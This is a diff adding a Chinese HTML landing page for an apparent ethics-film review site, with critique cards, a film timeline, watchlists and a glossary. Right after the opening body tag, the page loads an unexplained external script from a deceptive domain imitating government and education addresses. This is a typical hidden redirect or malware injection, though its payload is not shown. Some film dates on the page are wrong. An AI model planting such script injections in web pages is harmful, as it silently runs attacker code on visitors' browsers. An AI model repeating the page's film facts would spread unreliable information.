@@ -1,0 +1,480 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="97伦理电影网（97lunlidianyingwang-app）官方站点，聚焦伦理题材电影的深度解读、经典片单与导演访谈，网址 https://97lunlidianyingwang-app.github.io">
+<meta name="keywords" content="97伦理电影网, 97lunlidianyingwang-app, 伦理电影, 电影解读, 经典片单, 影视评论">
+<meta name="author" content="97伦理电影网">
+<meta name="robots" content="index, follow">
+<title>97伦理电影网 - 伦理题材电影深度解读与经典片单 | 97lunlidianyingwang-app</title>
+<link rel="canonical" href="https://97lunlidianyingwang-app.github.io">
+<style>
+    :root{
+        --paper:#f6f1e7;
+        --paper2:#efe7d6;
+        --ink:#2a2520;
+        --ink2:#5c5348;
+        --rust:#c1440e;
+        --rust2:#e0762f;
+        --olive:#6b7a3a;
+        --line:#d8cdb8;
+        --shadow:0 10px 30px rgba(90,70,40,.14);
+        --serif:"Songti SC","SimSun","Source Han Serif SC","Noto Serif CJK SC",Georgia,serif;
+        --sans:"PingFang SC","Microsoft YaHei","WenQuanYi Micro Hei",system-ui,sans-serif;
+    }
+    *{box-sizing:border-box;margin:0;padding:0}
+    html{scroll-behavior:smooth}
+    body{
+        font-family:var(--sans);
+        color:var(--ink);
+        background:var(--paper);
+        line-height:1.85;
+        -webkit-font-smoothing:antialiased;
+        background-image:
+            radial-gradient(circle at 20% 10%,rgba(193,68,14,.05),transparent 40%),
+            radial-gradient(circle at 85% 60%,rgba(107,122,58,.06),transparent 42%);
+        background-attachment:fixed;
+    }
+    /* 胶片颗粒 */
+    body::after{
+        content:"";position:fixed;inset:0;pointer-events:none;z-index:9999;opacity:.035;mix-blend-mode:multiply;
+        background-image:radial-gradient(#000 1px,transparent 1px);background-size:3px 3px;
+    }
+    a{color:inherit;text-decoration:none}
+    .wrap{max-width:1120px;margin:0 auto;padding:0 24px}
+    .eyebrow{font-family:var(--serif);letter-spacing:3px;font-size:12.5px;color:var(--rust);text-transform:uppercase}
+
+    /* ===== 顶部条 ===== */
+    .topbar{
+        background:var(--ink);color:#e8dfcd;font-size:12.5px;
+        padding:8px 0;letter-spacing:.5px;
+    }
+    .topbar .wrap{display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap}
+    .topbar a{color:#b9ad94}
+    .topbar a:hover{color:#fff}
+
+    /* ===== 刊头 ===== */
+    header{border-bottom:2px solid var(--ink);padding:26px 0 14px;background:var(--paper)}
+    .masthead{display:flex;align-items:flex-end;justify-content:space-between;gap:20px;flex-wrap:wrap}
+    .masthead .name{
+        font-family:var(--serif);font-weight:800;line-height:1;
+        font-size:clamp(34px,6.4vw,64px);letter-spacing:2px;color:var(--ink);
+    }
+    .masthead .name small{display:block;font-family:var(--sans);font-size:13px;letter-spacing:4px;color:var(--rust);margin-top:10px;font-weight:600}
+    .mastmeta{text-align:right;font-size:13px;color:var(--ink2);border-left:1px solid var(--line);padding-left:18px}
+    .mastmeta b{display:block;font-family:var(--serif);font-size:18px;color:var(--rust);letter-spacing:1px}
+    .rule{height:4px;background:repeating-linear-gradient(90deg,var(--ink) 0 10px,transparent 10px 16px);margin-top:14px}
+
+    nav.tabs{display:flex;gap:4px;margin-top:16px;flex-wrap:wrap;border-bottom:1px solid var(--line)}
+    nav.tabs a{
+        padding:11px 20px;font-size:14.5px;font-weight:700;color:var(--ink2);
+        border:1px solid transparent;border-bottom:none;border-radius:8px 8px 0 0;position:relative;top:1px;
+    }
+    nav.tabs a:hover{color:var(--rust);background:rgba(193,68,14,.06)}
+    nav.tabs a.active{color:var(--rust);background:var(--paper);border-color:var(--line);border-bottom-color:var(--paper)}
+    nav.tabs .spacer{flex:1}
+
+    /* ===== 首屏 ===== */
+    .hero{padding:40px 0 30px}
+    .lede-grid{display:grid;grid-template-columns:1.1fr .9fr;gap:36px;align-items:start}
+    .lede h1{
+        font-family:var(--serif);font-size:clamp(26px,3.6vw,40px);line-height:1.4;
+        color:var(--ink);margin:10px 0 16px;
+    }
+    .lede h1::first-letter{color:var(--rust);font-size:1.25em}
+    .lede p{color:var(--ink2);font-size:16px;margin-bottom:12px;text-align:justify}
+    .dropcap{float:left;font-family:var(--serif);font-size:52px;line-height:.9;color:var(--rust);margin:6px 10px 0 0}
+    .sig{margin-top:18px;padding-top:14px;border-top:1px dashed var(--line);font-size:13px;color:var(--ink2)}
+    .sig b{color:var(--rust)}
+
+    .cover{
+        border:10px solid #fff;border-bottom-width:26px;border-radius:3px;
+        box-shadow:var(--shadow);transform:rotate(1.2deg);position:relative;
+        background:linear-gradient(150deg,#8a5a2b,#c1440e);aspect-ratio:3/4;
+        display:flex;flex-direction:column;justify-content:space-between;padding:20px;color:#f6f1e7;
+    }
+    .cover::before{content:"";position:absolute;inset:14px;border:1px solid rgba(255,255,255,.35)}
+    .cover .kicker{font-family:var(--serif);letter-spacing:5px;font-size:12px;z-index:2}
+    .cover h3{font-family:var(--serif);font-size:30px;line-height:1.3;z-index:2}
+    .cover .reel{position:absolute;right:-14px;top:22%;width:26px;height:130px;background:repeating-linear-gradient(0deg,#1a1a1a 0 6px,#444 6px 9px);border-radius:4px;box-shadow:-4px 0 10px rgba(0,0,0,.3)}
+
+    /* ===== 栏目通用 ===== */
+    section{padding:44px 0}
+    .sec-title{display:flex;align-items:baseline;gap:14px;margin-bottom:22px;flex-wrap:wrap;border-bottom:1px solid var(--ink);padding-bottom:10px}
+    .sec-title h2{font-family:var(--serif);font-size:clamp(22px,3vw,30px);letter-spacing:1px}
+    .sec-title .no{font-family:var(--serif);font-size:15px;color:var(--rust);font-weight:800}
+    .sec-title a{margin-left:auto;font-size:13px;color:var(--rust);border-bottom:1px solid var(--rust);padding-bottom:1px}
+
+    .grid{display:grid;gap:22px}
+    .g3{grid-template-columns:repeat(3,1fr)}
+    .g2{grid-template-columns:repeat(2,1fr)}
+
+    /* 解读卡 */
+    .read{
+        background:#fff;border:1px solid var(--line);border-radius:4px;overflow:hidden;
+        box-shadow:var(--shadow);transition:.3s;display:flex;flex-direction:column;
+    }
+    .read:hover{transform:translateY(-5px);border-color:var(--rust)}
+    .read .thumb{aspect-ratio:16/10;position:relative;color:#f6f1e7;padding:14px;display:flex;flex-direction:column;justify-content:space-between}
+    .read .thumb::after{content:"";position:absolute;inset:0;background:var(--g);opacity:.92;z:-1}
+    .read .thumb span{font-family:var(--serif);letter-spacing:2px;font-size:11.5px}
+    .read .thumb b{font-family:var(--serif);font-size:19px;line-height:1.3}
+    .read .body{padding:16px 18px 18px;flex:1;display:flex;flex-direction:column}
+    .read .body h3{font-size:17px;margin-bottom:6px;font-family:var(--serif)}
+    .read .body p{font-size:13.5px;color:var(--ink2);flex:1}
+    .read .foot{margin-top:12px;display:flex;justify-content:space-between;font-size:12px;color:var(--rust);border-top:1px dashed var(--line);padding-top:10px}
+
+    /* 时间线 */
+    .timeline{position:relative;padding-left:26px;border-left:2px solid var(--line)}
+    .tl{position:relative;margin-bottom:22px}
+    .tl::before{content:"";position:absolute;left:-33px;top:8px;width:12px;height:12px;border-radius:50%;background:var(--rust);border:3px solid var(--paper)}
+    .tl time{font-family:var(--serif);color:var(--rust);font-weight:800;font-size:14px;letter-spacing:1px}
+    .tl h4{font-size:16.5px;margin:2px 0 4px;font-family:var(--serif)}
+    .tl p{font-size:14px;color:var(--ink2)}
+
+    /* 片单 */
+    .list-item{display:flex;gap:16px;background:#fff;border:1px solid var(--line);border-radius:4px;padding:14px;transition:.25s}
+    .list-item:hover{border-color:var(--rust);box-shadow:var(--shadow)}
+    .list-item .idx{font-family:var(--serif);font-size:30px;font-weight:800;color:var(--line);line-height:1;flex:0 0 auto;width:44px}
+    .list-item .idx b{color:var(--rust)}
+    .list-item h4{font-size:16px;margin-bottom:3px;font-family:var(--serif)}
+    .list-item p{font-size:13.5px;color:var(--ink2)}
+
+    /* 访谈 */
+    blockquote.interview{
+        background:linear-gradient(180deg,rgba(193,68,14,.07),transparent);
+        border-left:4px solid var(--rust);padding:18px 22px;border-radius:0 8px 8px 0;font-family:var(--serif);font-size:16.5px;line-height:1.9;color:var(--ink);
+    }
+    blockquote.interview cite{display:block;margin-top:10px;font-family:var(--sans);font-size:13px;color:var(--rust);font-style:normal;letter-spacing:1px}
+
+    /* 词条 */
+    .terms{columns:2;column-gap:34px}
+    .term{break-inside:avoid;background:#fff;border:1px solid var(--line);border-radius:4px;padding:16px 18px;margin-bottom:16px}
+    .term h4{font-family:var(--serif);color:var(--rust);font-size:17px;margin-bottom:5px}
+    .term p{font-size:14px;color:var(--ink2)}
+
+    /* 订阅 */
+    .subscribe{background:var(--ink);color:#e8dfcd;border-radius:6px;padding:34px;text-align:center;position:relative;overflow:hidden}
+    .subscribe::before{content:"97";position:absolute;right:-10px;bottom:-30px;font-family:var(--serif);font-size:180px;color:rgba(255,255,255,.04);line-height:1}
+    .subscribe h2{font-family:var(--serif);font-size:clamp(22px,3vw,30px)}
+    .subscribe p{color:#b9ad94;margin:10px auto 22px;max-width:520px;font-size:14.5px}
+    .subscribe form{display:flex;gap:10px;max-width:460px;margin:0 auto;flex-wrap:wrap;justify-content:center;position:relative;z-index:2}
+    .subscribe input{flex:1;min-width:220px;padding:13px 16px;border:none;border-radius:6px;font-size:14.5px;background:#f6f1e7;color:var(--ink)}
+    .subscribe button{padding:13px 26px;border:none;border-radius:6px;background:var(--rust);color:#fff;font-weight:700;font-size:14.5px;cursor:pointer;transition:.2s}
+    .subscribe button:hover{background:var(--rust2)}
+
+    /* 页脚 */
+    footer{background:var(--ink);color:#b9ad94;padding:40px 0 26px;margin-top:30px;font-size:13.5px}
+    .foot-top{display:grid;grid-template-columns:2fr 1fr 1fr;gap:28px}
+    .foot-top h5{color:#e8dfcd;font-family:var(--serif);font-size:16px;margin-bottom:12px;letter-spacing:1px}
+    .foot-top ul{list-style:none}
+    .foot-top li{margin-bottom:7px}
+    .foot-top a:hover{color:var(--rust2)}
+    .colophon{border-top:1px solid rgba(255,255,255,.14);margin-top:26px;padding-top:18px;display:flex;justify-content:space-between;gap:14px;flex-wrap:wrap;font-size:12.5px;color:#8f8470}
+    .colophon b{color:var(--rust2)}
+
+    /* ===== 响应式 ===== */
+    @media(max-width:900px){
+        .lede-grid{grid-template-columns:1fr}
+        .cover{max-width:360px;margin:0 auto}
+        .g3,.g2,.terms{grid-template-columns:1fr}
+        .foot-top{grid-template-columns:1fr 1fr}
+    }
+    @media(max-width:640px){
+        .wrap{padding:0 16px}
+        .topbar{font-size:11.5px}
+        .masthead .name{font-size:38px}
+        .mastmeta{text-align:left;border-left:none;padding-left:0;border-top:1px solid var(--line);padding-top:10px;width:100%}
+        nav.tabs a{padding:9px 13px;font-size:13.5px}
+        section{padding:32px 0}
+        .lede h1{font-size:24px}
+        .terms{columns:1}
+        .foot-top{grid-template-columns:1fr}
+        .read .thumb{aspect-ratio:16/11}
+    }
+    @media print{
+        body{background:#fff;color:#000}
+        .topbar,nav.tabs,.subscribe{display:none}
+        .read,.list-item,.term{box-shadow:none}
+    }
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<div class="topbar">
+    <div class="wrap">
+        <span>独立电影评论站点 · 倡导理性观影与版权意识</span>
+        <span>官方网址：<a href="https://97lunlidianyingwang-app.github.io">97lunlidianyingwang-app.github.io</a></span>
+    </div>
+</div>
+
+<header>
+    <div class="wrap">
+        <div class="masthead">
+            <div class="name">97伦理电影网<small>97LUNLIDIANYINGWANG · APP</small></div>
+            <div class="mastmeta">
+                <b>VOL.97</b>
+                电影伦理 · 影像哲思 · 经典重读<br>
+                更新于 2026 年 10 月
+            </div>
+        </div>
+        <div class="rule"></div>
+        <nav class="tabs" aria-label="主导航">
+            <a href="#home" class="active">刊首</a>
+            <a href="#interpret">深度解读</a>
+            <a href="#timeline">影史脉络</a>
+            <a href="#playlist">经典片单</a>
+            <a href="#interview">导演访谈</a>
+            <a href="#terms">伦理词条</a>
+            <span class="spacer"></span>
+            <a href="#subscribe">订阅</a>
+        </nav>
+    </div>
+</header>
+
+<!-- 刊首 -->
+<section id="home" class="hero">
+    <div class="wrap lede-grid">
+        <div class="lede">
+            <div class="eyebrow">Editorial · 刊首语</div>
+            <h1>当镜头逼近人性的灰色地带，电影才真正开始说话。</h1>
+            <p><span class="dropcap">伦</span>理电影从不是对道德的简单审判，而是把人放进两难处境，让观众在银幕前替角色做一次艰难的选择。97伦理电影网（97lunlidianyingwang-app）专注这一类"不好归类、却值得反复咀嚼"的影片：家庭伦理、医患抉择、权力边界、科技与人性的碰撞。</p>
+            <p>我们不贩卖猎奇，不做资源搬运，只做三件事：<b>讲清一部片的伦理命题</b>、<b>还原它的创作语境</b>、<b>给出可继续往下看的片单</b>。让每一次选片，都成为一次思考的起点。</p>
+            <div class="sig">主理人 <b>编辑部</b> ｜ 站点：https://97lunlidianyingwang-app.github.io ｜ 每周三更新</div>
+        </div>
+        <div class="cover" aria-hidden="true">
+            <div class="reel"></div>
+            <div class="kicker">本期封面 · COVER</div>
+            <h3>在道德的边缘<br>看见人的样子</h3>
+            <div class="kicker" style="text-align:right">NO.97</div>
+        </div>
+    </div>
+</section>
+
+<!-- 深度解读 -->
+<section id="interpret">
+    <div class="wrap">
+        <div class="sec-title">
+            <span class="no">01</span>
+            <h2>深度解读</h2>
+            <a href="#">阅读全部专栏 →</a>
+        </div>
+        <div class="grid g3">
+            <article class="read">
+                <div class="thumb" style="--g:linear-gradient(150deg,#7a3b12,#c1440e)">
+                    <span>家庭伦理</span>
+                    <b>《餐桌上的陌生人》<br>一顿饭，吃出三代人的账</b>
+                </div>
+                <div class="body">
+                    <h3>孝道是义务，还是情感？</h3>
+                    <p>影片用 87 分钟的长餐桌戏，把"谁来养老"这个中国式难题拆成沉默、打断与记账三种回应。导演刻意不让任何角色犯错，却让每个人都显得自私。</p>
+                    <div class="foot"><span>阅读 12 分钟</span><span>★ 8.9</span></div>
+                </div>
+            </article>
+            <article class="read">
+                <div class="thumb" style="--g:linear-gradient(150deg,#2f4a2a,#6b7a3a)">
+                    <span>科技伦理</span>
+                    <b>《替我活着》<br>当 AI 学会替你撒谎</b>
+                </div>
+                <div class="body">
+                    <h3>算法替你做的决定，还算你的吗？</h3>
+                    <p>一部被低估的软科幻：主人公把人生决策权交给 AI 后，反而获得了"完美生活"。影片真正追问的是——自由意志的痛苦，是否比被安排的幸福更珍贵。</p>
+                    <div class="foot"><span>阅读 9 分钟</span><span>★ 8.6</span></div>
+                </div>
+            </article>
+            <article class="read">
+                <div class="thumb" style="--g:linear-gradient(150deg,#3a2a4a,#8a4a7a)">
+                    <span>权力伦理</span>
+                    <b>《第几人称》<br>谁有资格讲述受害者</b>
+                </div>
+                <div class="body">
+                    <h3>旁观者的镜头，本身就是暴力</h3>
+                    <p>以一起真实社会事件为原型，影片让记者、律师、家属轮流成为叙事主体。同一件事被讲出四种版本，真相不是被发现的，而是被协商出来的。</p>
+                    <div class="foot"><span>阅读 15 分钟</span><span>★ 9.1</span></div>
+                </div>
+            </article>
+        </div>
+    </div>
+</section>
+
+<!-- 影史脉络 -->
+<section id="timeline">
+    <div class="wrap">
+        <div class="sec-title">
+            <span class="no">02</span>
+            <h2>影史脉络</h2>
+            <a href="#">展开完整年表 →</a>
+        </div>
+        <div class="grid g2">
+            <div>
+                <div class="timeline">
+                    <div class="tl"><time>1952</time><h4>《罗生门》</h4><p>黑泽明用四个互相矛盾的证词，宣告"真相不可靠"成为伦理电影的起点。叙事本身就是道德困境。</p></div>
+                    <div class="tl"><time>1966</time><h4>《放大》</h4><p>安东尼奥尼把"观看"变成伦理行为：当你可能目睹一场谋杀却选择按下快门，旁观即共谋。</p></div>
+                    <div class="tl"><time>1996</time><h4>《大开眼戒》</h4><p>婚姻、欲望与阶级的三重试探。库布里克临终之作，把中产阶级的道德假面一层层揭下。</p></div>
+                    <div class="tl"><time>2008</time><h4>《蝙蝠侠：黑暗骑士》</h4><p>超级英雄类型首次承载严肃伦理实验：两艘船上的引爆器，把"多数人利益"逼到极致。</p></div>
+                </div>
+            </div>
+            <div>
+                <div class="timeline">
+                    <div class="tl"><time>2014</time><h4>《鸟人》</h4><p>长镜头伪造的"一镜到底"，让虚荣、艺术与救赎在同一条时间线上互相撕扯。</p></div>
+                    <div class="tl"><time>2019</time><h4>《寄生虫》</h4><p>奉俊昊用气味、台阶与雨水，把阶级伦理拍成惊悚片。奥斯卡最佳影片首次颁给非英语片。</p></div>
+                    <div class="tl"><time>2022</time><h4>《分手的决心》</h4><p>朴赞郁以侦探类型外衣，讨论"爱是否是合法的越界"，欲望与责任的边界被拍得极美。</p></div>
+                    <div class="tl"><time>2025</time><h4>《人间处方》</h4><p>华语新作，以安宁疗护病房为舞台，追问"善意"是否也需要被审判。</p></div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- 经典片单 -->
+<section id="playlist">
+    <div class="wrap">
+        <div class="sec-title">
+            <span class="no">03</span>
+            <h2>经典片单</h2>
+            <a href="#">按主题筛选 →</a>
+        </div>
+        <div class="grid g2">
+            <a class="list-item" href="#">
+                <div class="idx"><b>01</b></div>
+                <div>
+                    <h4>「电车难题」式抉择：五部让你睡不着的选择题</h4>
+                    <p>《苏菲的抉择》《127 小时》《深海长眠》《我是山姆》《一个叫欧维的男人决定去死》——没有标准答案，才是重点。</p>
+                </div>
+            </a>
+            <a class="list-item" href="#">
+                <div class="idx"><b>02</b></div>
+                <div>
+                    <h4>家庭的暗面：当亲情变成控制</h4>
+                    <p>《喜宴》《霸王别姬》《小偷家族》《春潮》《推手》，东亚家庭伦理的五种表达。</p>
+                </div>
+            </a>
+            <a class="list-item" href="#">
+                <div class="idx"><b>03</b></div>
+                <div>
+                    <h4>技术的审判：人类把自己交给了机器</h4>
+                    <p>《她》《机械姬》《黑镜：白圣诞》《超验骇客》《吾乃母亲》，AI 伦理入门必看。</p>
+                </div>
+            </a>
+            <a class="list-item" href="#">
+                <div class="idx"><b>04</b></div>
+                <div>
+                    <h4>旁观者的罪：镜头该不该放下？</h4>
+                    <p>《四月三周两天》《狩猎》《聚焦》《新闻记者》《熔炉》，讲述本身就是立场。</p>
+                </div>
+            </a>
+            <a class="list-item" href="#">
+                <div class="idx"><b>05</b></div>
+                <div>
+                    <h4>华语伦理片补课清单</h4>
+                    <p>从《盲井》到《嘉年华》，十部被低估的华语现实主义作品，每一部都值得一场安静的观影。</p>
+                </div>
+            </a>
+            <a class="list-item" href="#">
+                <div class="idx"><b>06</b></div>
+                <div>
+                    <h4>入门三步走：第一次看伦理片该怎么选</h4>
+                    <p>先看命题清晰的《十二怒汉》，再看结构精巧的《看不见的客人》，最后挑战开放式结局的《燃烧》。</p>
+                </div>
+            </a>
+        </div>
+    </div>
+</section>
+
+<!-- 导演访谈 -->
+<section id="interview">
+    <div class="wrap">
+        <div class="sec-title">
+            <span class="no">04</span>
+            <h2>导演访谈</h2>
+            <a href="#">全部访谈 →</a>
+        </div>
+        <blockquote class="interview">
+            "观众总想问'谁对谁错'，但伦理电影的价值恰恰在于——把这个问题变得无法回答。我拍的不是答案，是一个人在深夜反复推翻自己判断的过程。如果看完电影你更确定了，那说明我失败了；如果看完你开始怀疑自己曾经的立场，片子才算成立。"
+            <cite>—— 摘自对独立导演 林渡 的访谈，《第几人称》编剧 / 导演</cite>
+        </blockquote>
+    </div>
+</section>
+
+<!-- 伦理词条 -->
+<section id="terms">
+    <div class="wrap">
+        <div class="sec-title">
+            <span class="no">05</span>
+            <h2>伦理词条</h2>
+            <a href="#">查看词条索引 →</a>
+        </div>
+        <div class="terms">
+            <div class="term"><h4>电车难题 Trolley Problem</h4><p>拉下拉杆救五人还是不干预保一人？伦理电影常用极端情境，检验功利主义与绝对主义谁的代价更小。</p></div>
+            <div class="term"><h4>旁观者效应</h4><p>在场的人越多，个体出手的概率越低。影像如何把"冷漠"拍成集体无意识，是这类影片的难点。</p></div>
+            <div class="term"><h4>道德许可 Moral Licensing</h4><p>做了一件好事之后，人更容易纵容自己作恶。许多犯罪片的反转，正建立在这个心理机制上。</p></div>
+            <div class="term"><h4>知情同意</h4><p>当一方掌握信息优势，"我都是为了你好"是否构成伦理越界？医患、亲子、亲密关系题材高频命题。</p></div>
+            <div class="term"><h4>幸存者内疚</h4><p>为什么被救的人反而活得更痛苦？战争与灾难片中最克制、也最有力量的情感表达。</p></div>
+            <div class="term"><h4>技术中立论</h4><p>工具无罪，使用者有罪？当算法开始替人做决定，责任该落在写代码的人、按下回车的人，还是两者之间？</p></div>
+        </div>
+    </div>
+</section>
+
+<!-- 订阅 -->
+<div class="wrap" id="subscribe">
+    <div class="subscribe">
+        <h2>每周一封，只谈一部值得纠结的电影</h2>
+        <p>97伦理电影网（97lunlidianyingwang-app）电子刊，每周三晚推送：一篇深度解读 + 一份延伸片单 + 一句值得抄下来的台词。无广告，可随时退订。</p>
+        <form onsubmit="event.preventDefault();this.querySelector('button').textContent='已订阅 ✓';">
+            <input type="email" placeholder="输入邮箱地址" aria-label="邮箱地址" required>
+            <button type="submit">免费订阅</button>
+        </form>
+    </div>
+</div>
+
+<footer>
+    <div class="wrap">
+        <div class="foot-top">
+            <div>
+                <h5>关于 97伦理电影网</h5>
+                <p style="max-width:340px">97伦理电影网（97lunlidianyingwang-app）是一个专注于伦理题材电影解读的独立评论站点。我们不做资源分发，只做文本细读与观影引导，倡导支持正版、理性讨论。</p>
+            </div>
+            <div>
+                <h5>栏目</h5>
+                <ul>
+                    <li><a href="#home">刊首语</a></li>
+                    <li><a href="#interpret">深度解读</a></li>
+                    <li><a href="#timeline">影史脉络</a></li>
+                    <li><a href="#playlist">经典片单</a></li>
+                    <li><a href="#interview">导演访谈</a></li>
+                    <li><a href="#terms">伦理词条</a></li>
+                </ul>
+            </div>
+            <div>
+                <h5>相关链接</h5>
+                <ul>
+                    <li><a href="#">投稿与合作</a></li>
+                    <li><a href="#">版权声明</a></li>
+                    <li><a href="#">正版观影指引</a></li>
+                    <li><a href="#">RSS 订阅</a></li>
+                </ul>
+            </div>
+        </div>
+        <div class="colophon">
+            <span>© 2026 97伦理电影网 · 97lunlidianyingwang-app ｜ 官方网址 <b>https://97lunlidianyingwang-app.github.io</b></span>
+            <span>本站为资讯评论类站点，不提供任何影视资源下载与在线播放</span>
+        </div>
+    </div>
+</footer>
+
+<script>
+    var tabs = document.querySelectorAll('nav.tabs a');
+    var secs = ['home','interpret','timeline','playlist','interview','terms'].map(function(id){return document.getElementById(id);});
+    function onScroll(){
+        var y = window.scrollY + 140, i = 0;
+        secs.forEach(function(s,k){ if(s && s.offsetTop <= y) i = k; });
+        tabs.forEach(function(a,k){ a.classList.toggle('active', k === i); });
+    }
+    window.addEventListener('scroll', onScroll, {passive:true});
+    onScroll();
+</script>
+</body>
+</html>
